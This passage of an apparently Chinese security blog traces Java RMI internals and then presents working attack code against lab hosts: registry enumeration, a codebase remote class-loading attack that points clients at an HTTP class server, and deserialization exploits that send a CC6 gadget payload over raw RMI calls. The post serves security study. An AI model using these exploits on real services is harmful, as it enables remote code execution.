class="string">&quot;error unmarshalling return&quot;</span>, var15);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.ref.done(var2);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们删除了所有catch的异常。然后我们追踪到invoke中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void invoke(RemoteCall var1) throws Exception &#123;</span><br><span class="line">       try &#123;</span><br><span class="line">           clientRefLog.log(Log.VERBOSE, &quot;execute call&quot;);</span><br><span class="line">           var1.executeCall();</span><br></pre></td></tr></table></figure><p><code>StreamRemoteCall#</code>executeCall</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">executeCall</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">DGCAckHandler</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">byte</span> var1;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.out != <span class="literal">null</span>) &#123;</span><br><span class="line">            var2 = <span class="built_in">this</span>.out.getDGCAckHandler();<span class="comment">//这里有一个新协议DGC</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.releaseOutputStream();</span><br><span class="line">        <span class="type">DataInputStream</span> <span class="variable">var3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="built_in">this</span>.conn.getInputStream());</span><br><span class="line">        <span class="type">byte</span> <span class="variable">var4</span> <span class="operator">=</span> var3.readByte();</span><br><span class="line">        <span class="keyword">if</span> (var4 != <span class="number">81</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Transport.transportLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                Transport.transportLog.log(Log.BRIEF, <span class="string">&quot;transport return code invalid: &quot;</span> + var4);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Transport return code invalid&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.getInputStream();</span><br><span class="line">        var1 = <span class="built_in">this</span>.in.readByte();</span><br><span class="line">        <span class="built_in">this</span>.in.readID();</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">switch</span>(var1) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        Object var14;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var14 = <span class="built_in">this</span>.in.readObject();</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">if</span> (!(var14 <span class="keyword">instanceof</span> Exception)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Return type not Exception&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.exceptionReceivedFromServer((Exception)var14);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">if</span> (Transport.transportLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">            Transport.transportLog.log(Log.BRIEF, <span class="string">&quot;return code invalid: &quot;</span> + var1);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;Return code invalid&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到此为止，用户端的请求构造也告一段落了。下面就是服务端的处理了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">target.run();下断点</span><br></pre></td></tr></table></figure><p>然后一步一步跟踪</p><p><img src="https://img.dem0dem0.top/images/image-20220430172920205.png" alt="image-20220430172920205"></p><p>一步一步我们找到了Transport的serviceCall()方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">serviceCall</span><span class="params">(<span class="keyword">final</span> RemoteCall var1)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ObjID var39;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var39 = ObjID.read(var1.getInputStream());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var33) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;unable to read objID&quot;</span>, var33);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Transport</span> <span class="variable">var40</span> <span class="operator">=</span> var39.equals(dgcID) ? <span class="literal">null</span> : <span class="built_in">this</span>;</span><br><span class="line">        <span class="comment">//获取目标对象，5.2.1启动服务的时候put进去的</span></span><br><span class="line">       <span class="comment">// 还记得我们在bindings中存放的其实是OperationImpl的真正实现，并非是Stub对象。</span></span><br><span class="line">        <span class="type">Target</span> <span class="variable">var5</span> <span class="operator">=</span> ObjectTable.getTarget(<span class="keyword">new</span> <span class="title class_">ObjectEndpoint</span>(var39, var40));</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="keyword">final</span> Remote var37;</span><br><span class="line">        <span class="keyword">if</span> (var5 != <span class="literal">null</span> &amp;&amp; (var37 = var5.getImpl()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">Dispatcher</span> <span class="variable">var6</span> <span class="operator">=</span> var5.getDispatcher();</span><br><span class="line">            var5.incrementCallCount();</span><br><span class="line">            <span class="type">boolean</span> var8;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                transportLog.log(Log.VERBOSE, <span class="string">&quot;call dispatcher&quot;</span>);</span><br><span class="line">                <span class="keyword">final</span> <span class="type">AccessControlContext</span> <span class="variable">var7</span> <span class="operator">=</span> var5.getAccessControlContext();</span><br><span class="line">                <span class="type">ClassLoader</span> <span class="variable">var41</span> <span class="operator">=</span> var5.getContextClassLoader();</span><br><span class="line">                <span class="type">ClassLoader</span> <span class="variable">var9</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    setContextClassLoader(var41);</span><br><span class="line">                    currentTransport.set(<span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedExceptionAction</span>&lt;Void&gt;() &#123;</span><br><span class="line">                            <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                                Transport.<span class="built_in">this</span>.checkAcceptPermission(var7);</span><br><span class="line">                                var6.dispatch(var37, var1);</span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;, var7);</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (PrivilegedActionException var31) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> (IOException)var31.getException();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    setContextClassLoader(var9);</span><br><span class="line">                    currentTransport.set((Object)<span class="literal">null</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var34) &#123;</span><br><span class="line">                transportLog.log(Log.BRIEF, <span class="string">&quot;exception thrown by dispatcher: &quot;</span>, var34);</span><br><span class="line">                var8 = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                var5.decrementCallCount();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> var8;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchObjectException</span>(<span class="string">&quot;no such object in table&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回了一个proxy对象。然后利用<code>RemoteObjectInvocationHandler</code>invoke来调用方法。下面这两个是我还没有debug到的，但是我们看到了在整个的处理过程中，存在许多的readobject()。</p><ul><li>服务端通过<code>sun.rmi.transport.tcp.TCPTransport#handleMessages</code>中的循环来监听输入流</li><li>对应的，服务端远程对象使用<code>sun.rmi.UnicastServerRef</code>来处理远端对本服务对象的调用。</li></ul><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>略~~~~</p><h3 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h3><blockquote><p>参考: <a href="https://github.com/qtc-de/remote-method-guesser">https://github.com/qtc-de/remote-method-guesser</a></p></blockquote><h4 id="1-信息泄露"><a href="#1-信息泄露" class="headerlink" title="1. 信息泄露"></a>1. 信息泄露</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dem0.vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.dem0.internal.ReflectUtils;</span><br><span class="line"><span class="keyword">import</span> de.qtc.rmg.networking.RMIRegistryEndpoint;</span><br><span class="line"><span class="keyword">import</span> de.qtc.rmg.plugin.PluginSystem;</span><br><span class="line"><span class="keyword">import</span> de.qtc.rmg.utils.RemoteObjectWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">infoLeak</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;192.168.59.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line"><span class="comment">//            System.out.println(registry.list());</span></span><br><span class="line">            ReflectUtils.enableCustomRMIClassLoader();</span><br><span class="line">            PluginSystem.init(<span class="literal">null</span>);</span><br><span class="line">            <span class="type">RMIRegistryEndpoint</span> <span class="variable">rmiRegistry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIRegistryEndpoint</span>(<span class="string">&quot;192.168.59.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line"><span class="comment">//            Remote[] remoteObjList = rmiRegistry.packup(registry.list());</span></span><br><span class="line">            RemoteObjectWrapper[] rows = rmiRegistry.lookup(registry.list());</span><br><span class="line">            <span class="keyword">for</span> ( RemoteObjectWrapper row: rows) &#123;</span><br><span class="line">                System.out.println(row.className +<span class="string">&quot;\tport:&quot;</span> +  row.endpoint.getPort());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Throwable t)&#123;</span><br><span class="line">            t.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="2-远程加载类"><a href="#2-远程加载类" class="headerlink" title="2. 远程加载类"></a>2. 远程加载类</h4><blockquote><p>codebase: 一个神奇的配置</p></blockquote><p>server</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dem0.rmi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RegCalc</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.useCodebaseOnly&quot;</span>, <span class="string">&quot;false&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.security.policy&quot;</span>, <span class="string">&quot;vuln.policy&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;setup SecurityManager&quot;</span>);</span><br><span class="line">            System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">SecurityManager</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Math</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Math</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;r&quot;</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RegCalc</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>client</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dem0.vuln;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.dem0.rmi.ICalc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">codeBaseAttack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Payload</span> <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&lt;Integer&gt; &#123;&#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.security.policy&quot;</span>, <span class="string">&quot;vuln.policy&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.codebase&quot;</span>,<span class="string">&quot;http://192.168.59.1:9080/&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;setup SecurityManager&quot;</span>);</span><br><span class="line">            System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">SecurityManager</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NotBoundException, MalformedURLException &#123;</span><br><span class="line">        <span class="type">ICalc</span> <span class="variable">r</span> <span class="operator">=</span> (ICalc) Naming.lookup(<span class="string">&quot;rmi://192.168.59.1:1099/r&quot;</span>);</span><br><span class="line">        List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">        li.add(<span class="number">1</span>);</span><br><span class="line">        li.add(<span class="number">2</span>);</span><br><span class="line">        System.out.println(r.sum(li));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vuln.policy</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>因为从远程codebase加载类具有高危性，所以只有满足如下条件的RMI客户端&#x2F;服务端才能被攻击：</p><ul><li>安装并配置了SecurityManager</li><li>设置了 java.rmi.server.useCodebaseOnly&#x3D;false 或者Java版本低于7u21、6u45(此时该值默认为false)</li></ul><h4 id="3-序列化安全问题"><a href="#3-序列化安全问题" class="headerlink" title="3.序列化安全问题"></a>3.序列化安全问题</h4><p>我们在debug的时候发现,在处理的时候，实际上对象是绑定在本地JVM中，只有函数参数和返回值是通过网络传送的，所以这几个部分就会设计到<code>序列化和反序列化</code>(网络传输的必备)</p><ul><li>参数</li><li>返回值</li><li><code>异常处理</code></li></ul><h5 id="远程方法参数反序列化-服务端远程参数是object和远程参数不是object"><a href="#远程方法参数反序列化-服务端远程参数是object和远程参数不是object" class="headerlink" title="远程方法参数反序列化(服务端远程参数是object和远程参数不是object)"></a>远程方法参数反序列化(<code>服务端</code>远程参数是object和远程参数不是object)</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.dem0.rmi;</span><br><span class="line"><span class="keyword">import</span> com.dem0.vuln.CC6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;192.168.59.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line">            <span class="type">ICalc</span> <span class="variable">calc</span> <span class="operator">=</span> (ICalc) registry.lookup(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">            li.add(<span class="number">1</span>);</span><br><span class="line">            li.add(<span class="number">2</span>);</span><br><span class="line">            System.out.println(calc.equ(<span class="keyword">new</span> <span class="title class_">CC6</span>().getPayload(),<span class="number">1</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是在这里，我们有一个利用的前提，就是参数必须首先是<code>object</code>属性的，不然他是不是不会触发readObejct的，为了继续深入理解，我们继续看<code>UnicastServerRef#dispatch</code>所以我们知道这是一个分发接口的。偷一下<code>eki</code>大哥哥的简化流程</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//var4是传入的Method hash 拿到对应的method</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">var42</span> <span class="operator">=</span> (Method)<span class="built_in">this</span>.hashToMethod_Map.get(var4);</span><br><span class="line"><span class="comment">//var1是远程对象 var7是传入的参数输入流  调用this.unmarshalParameter对应的去反序列化成参数</span></span><br><span class="line">var9 = <span class="built_in">this</span>.unmarshalParameters(var1, var42, var7);</span><br><span class="line"><span class="comment">//最后调用方法得到结果</span></span><br><span class="line">var10 = var42.invoke(var1, var9);</span><br></pre></td></tr></table></figure><p>参数传入<code>unmarshalParameters</code>最后调用的<code>unmarshalValue</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    var0 ===&gt; type数组  var1===&gt; 参数的输入流</span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> Object <span class="title function_">unmarshalValue</span><span class="params">(Class&lt;?&gt; var0, ObjectInput var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (var0.isPrimitive()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (var0 == Integer.TYPE) &#123;</span><br><span class="line">                <span class="keyword">return</span> var1.readInt();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Boolean.TYPE) &#123;</span><br><span class="line">                <span class="keyword">return</span> var1.readBoolean();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Byte.TYPE) &#123;</span><br><span class="line">                <span class="keyword">return</span> var1.readByte();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Character.TYPE) &#123;</span><br><span class="line">                <span class="keyword">return</span> var1.readChar();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Short.TYPE) &#123;</span><br><span class="line">                <span class="keyword">return</span> var1.readShort();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Long.TYPE) &#123;</span><br><span class="line">                <span class="keyword">return</span> var1.readLong();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Float.TYPE) &#123;</span><br><span class="line">                <span class="keyword">return</span> var1.readFloat();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var0 == Double.TYPE) &#123;</span><br><span class="line">                <span class="keyword">return</span> var1.readDouble();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Unrecognized primitive type: &quot;</span> + var0);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">return</span> <span class="variable">var0</span> <span class="operator">=</span>= String.class &amp;&amp; var1 <span class="keyword">instanceof</span> ObjectInputStream ? SharedSecrets.getJavaObjectInputStreamReadString().readString((ObjectInputStream)var1) : var1.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到只要参数类型不是<code>var0.isPrimitive()</code>,和String 就会触发上面<code>readObject</code>，所以也可以攻击成功。</p><p>然后我们直接开整<code>javap  -s com.dem0.rmi.Math</code>,算出方法的描述符</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Compiled from <span class="string">&quot;Math.java&quot;</span></span><br><span class="line">public class com.dem0.rmi.Math extends java.rmi.server.UnicastRemoteObject implements com.dem0.rmi.IMath &#123;</span><br><span class="line">  protected com.dem0.rmi.Math() throws java.rmi.RemoteException;</span><br><span class="line">    descriptor: ()V</span><br><span class="line"></span><br><span class="line">  public java.lang.Integer <span class="built_in">sum</span>(java.util.List&lt;java.lang.Integer&gt;) throws java.rmi.RemoteException;</span><br><span class="line">    descriptor: (Ljava/util/List;)Ljava/lang/Integer;</span><br><span class="line"></span><br><span class="line">  public java.lang.Integer add(java.lang.Integer, java.lang.Integer) throws java.rmi.RemoteException;</span><br><span class="line">    descriptor: (Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 参数类型为非对象类型</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">sendRawCall</span><span class="params">(String host, <span class="type">int</span> port, ObjID objid, <span class="type">int</span> opNum, Long hash, Object ...objects)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> SocketFactory.getDefault().createSocket(host, port);</span><br><span class="line">    socket.setKeepAlive(<span class="literal">true</span>);</span><br><span class="line">    socket.setTcpNoDelay(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">DataOutputStream</span> <span class="variable">dos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> socket.getOutputStream();</span><br><span class="line">        dos = <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(os);</span><br><span class="line"></span><br><span class="line">        dos.writeInt(TransportConstants.Magic);</span><br><span class="line">        dos.writeShort(TransportConstants.Version);</span><br><span class="line">        dos.writeByte(TransportConstants.SingleOpProtocol);</span><br><span class="line">        dos.write(TransportConstants.Call);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MarshalOutputStream</span>(dos);</span><br><span class="line"></span><br><span class="line">        objid.write(objOut); <span class="comment">//Objid</span></span><br><span class="line">        objOut.writeInt(opNum); <span class="comment">// opnum</span></span><br><span class="line">        objOut.writeLong(hash); <span class="comment">// hash</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Object object:</span><br><span class="line">                objects) &#123;</span><br><span class="line">            objOut.writeObject(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        os.flush();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (dos != <span class="literal">null</span>) &#123;</span><br><span class="line">            dos.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (socket != <span class="literal">null</span>) &#123;</span><br><span class="line">            socket.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">long</span> <span class="title function_">computeMethodHash</span><span class="params">(String methodSignature)</span> &#123;</span><br><span class="line">    <span class="type">long</span> <span class="variable">hash</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">sink</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>(<span class="number">127</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">MessageDigest</span> <span class="variable">md</span> <span class="operator">=</span> MessageDigest.getInstance(<span class="string">&quot;SHA&quot;</span>);</span><br><span class="line">        <span class="type">DataOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(<span class="keyword">new</span> <span class="title class_">DigestOutputStream</span>(sink, md));</span><br><span class="line"></span><br><span class="line">        out.writeUTF(methodSignature);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// use only the first 64 bits of the digest for the hash</span></span><br><span class="line">        out.flush();</span><br><span class="line">        <span class="type">byte</span> hasharray[] = md.digest();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; Math.min(<span class="number">8</span>, hasharray.length); i++) &#123;</span><br><span class="line">            hash += ((<span class="type">long</span>) (hasharray[i] &amp; <span class="number">0xFF</span>)) &lt;&lt; (i * <span class="number">8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException ignore) &#123;</span><br><span class="line">        <span class="comment">/* can&#x27;t happen, but be deterministic anyway. */</span></span><br><span class="line">        hash = -<span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchAlgorithmException complain) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(complain.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">genpayload2</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ReflectUtils.enableCustomRMIClassLoader();</span><br><span class="line">        PluginSystem.init(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">RMIRegistryEndpoint</span> <span class="variable">rmiRegistry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIRegistryEndpoint</span>(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="comment">//还记得遍历攻击里我们实现的无依赖获取远程对象存根吗，这里直接套用了。</span></span><br><span class="line">        <span class="type">RemoteObjectWrapper</span> <span class="variable">remoteObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectWrapper</span>(rmiRegistry.lookup(<span class="string">&quot;r&quot;</span>),<span class="string">&quot;math&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">payloadObj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CC6</span>().getPayload();</span><br><span class="line">        <span class="comment">//methodSignature 可以通过javap -s 类名计算</span></span><br><span 